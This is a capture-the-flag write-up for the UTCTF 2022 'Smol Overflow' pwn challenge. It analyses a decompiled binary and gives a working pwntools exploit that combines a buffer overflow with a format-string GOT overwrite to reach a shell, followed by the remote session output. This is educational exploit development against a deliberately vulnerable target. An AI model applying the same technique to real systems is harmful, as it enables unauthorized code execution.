# UTCTF 2022

## Smol Overflow 

> You can have a little overflow, as a treat
> 
> By Tristan (@trab on discord)
>
> `nc pwn.utctf.live 5004` 
>
> [`smol`](smol)

Tags: _pwn_ _x86-64_ _bof_ _format-string_ _got-overwrite_ _remote-shell_


## Summary

Basic format-string GOT overwrite exploit with BOF to write out format string.  _win_ function included!


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Partial RELRO + No PIE = GOT overwrite or ROP if you have BOF and canary.


### Ghidra Decompile

```c
undefined8 main(void)
{
  char cVar1;
  int iVar2;
  ulong uVar3;
  char *pcVar4;
  long in_FS_OFFSET;
  byte bVar5;
  char local_158 [111];
  undefined4 uStack233;
  undefined2 uStack229;
  char local_78 [104];
  long local_10;
  
  bVar5 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("What kind of data do you have?");
  gets(local_158);
  iVar2 = strcmp(local_158,"big data");
  if (iVar2 == 0) {
    uVar3 = 0xffffffffffffffff;
    pcVar4 = (char *)((long)&uStack233 + 1);
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + (ulong)bVar5 * -2 + 1;
    } while (cVar1 != '\0');
    *(undefined4 *)((long)&uStack233 + ~uVar3) = 0x30322025;
    *(undefined2 *)((long)&uStack229 + ~uVar3) = 0x73;
  }
  else {
    iVar2 = strcmp(local_158,"smol data");
    if (iVar2 == 0) {
      uVar3 = 0xffffffffffffffff;
      pcVar4 = (char *)((long)&uStack233 + 1);
      do {
        if (uVar3 == 0) break;
        uVar3 = uVar3 - 1;
        cVar1 = *pcVar4;
        pcVar4 = pcVar4 + (ulong)bVar5 * -2 + 1;
      } while (cVar1 != '\0');
      *(undefined4 *)((long)&uStack233 + ~uVar3) = 0x73352025;
      *(undefined *)((long)&uStack229 + ~uVar3) = 0;
    }
    else {
      puts("Error");
    }
  }
  puts("Give me your data");
  gets(local_78);
  printf((char *)((long)&uStack233 + 1),local_78);
  putchar(10);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

> _smol_ this isn't.  Most "smol" challenges are a few lines.  At least the solve is "smol".
>
> Not shown is the win function `get_flag`.  Clearly the objective is to execute that.

There's a few `gets` here we can exploit as well as `printf`.

The first prompt will change the format string if you enter `big data` or `smol data`.  None of this is important.

```
  char local_158 [111];
  undefined4 uStack233;
  undefined2 uStack229;
  char local_78 [104];
```

Above is how the variables are stacked up in the stack.  The format string is at `uStack233 + 1`:

```
  printf((char *)((long)&uStack233 + 1),local_78);
```

`gets(local_158);` can be used to overwrite the format string; just send `0x158 - 233 + 1` of garbage followed by your format string.  It's that easy.  Why `0x158` and `233`?  Look at the variables above.  `local_158` is `0x158` bytes from the end of the stack frame.  `uStack233` is `233` (decimal) bytes from the end of the stack frame (Ghidra uses an underscore for hex).

The format string just needs to replace `putchar` with `get_flag` so that on `putchar(10);` invocation we get a shell.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./smol',checksec=False)

if args.REMOTE:
    p = remote('pwn.utctf.live', 5004)
else:
    p = process(binary.path)

offset = (0x158 - 233 + 1) // 8 + 6

payload  = b''
payload += (0x158 - 233 + 1) * b'A'
payload += fmtstr_payload(offset,{binary.got.putchar:binary.sym.get_flag})

assert(len(payload) < (0x158 - 0x78))

p.sendlineafter(b'have?\n',payload)
p.sendlineafter(b'data\n',b'')
p.interactive()
```

The `assert` is there to make sure our payload does not allow the second `gets` to _get_ in our way, if it did, we'd have to make sure to overwrite the rest of our payload correctly.  IOW, just keep it short.


```bash
# ./exploit.py REMOTE=1
[+] Opening connection to pwn.utctf.live on port 5004: Done
[*] Switching to interactive mode
$ cat flag.txt
utflag{just_a_little_salami15983350}
```
